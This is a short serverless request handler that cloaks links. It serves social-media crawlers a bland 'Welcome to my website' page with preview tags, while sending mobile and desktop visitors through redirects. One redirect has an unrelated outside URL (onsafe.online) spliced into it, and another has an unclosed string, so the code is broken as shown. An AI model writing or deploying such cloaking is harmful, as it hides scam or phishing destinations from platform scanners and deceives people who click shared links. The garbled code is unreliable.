export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get("user-agent") || "";

  // Social-media crawlers
  const isSocialBot =
    /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(
      userAgent
    );

  if (isSocialBot) {
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>My Website</title>

  <meta
    name="description"
    content="Welcome to my website."
  >

  <meta property="og:title" content="My Website">
  <meta
    property="og:description"
    content="Welcome to my website."
  >
  <meta
    property="og:image"
    content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Sun-Sep-20-2026/fc93ded8-4e5a-4d83-83ee-00dedd7ee85d/ee3f2540-b4ff-4cd3-907e-1f505dc2fc46.tiff"
  >
  <meta
    property="og:url"
    content="${new URL(request.url).origin}"
  >
  <meta property="og:type" content="website">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="My Website">
  <meta
    name="twitter:description"
    content="Welcome to my website."
  >
  <meta
    name="twitter:image"
    content="https://example.com/preview.jpg"
  >
</head>
<body>
  <h1>Welcome</h1>
  <p>Thanks for visiting.</p>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        "content-type": "text/html; charset=UTF-8",
        "cache-control": "public, max-age=300"
      }
    });
  }

  // Mobile users
  const isMobile =
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
      userAgent
    );

  if (isMobile) {
    return Response.redirect(
      new URL("/mobile", request.url).toString(),https://onsafe.online/news/6uaw
      302
    );
  }

  // Desktop users
  return Response.redirect(
    new URL("Google.com).toString(),
    302
  );
}
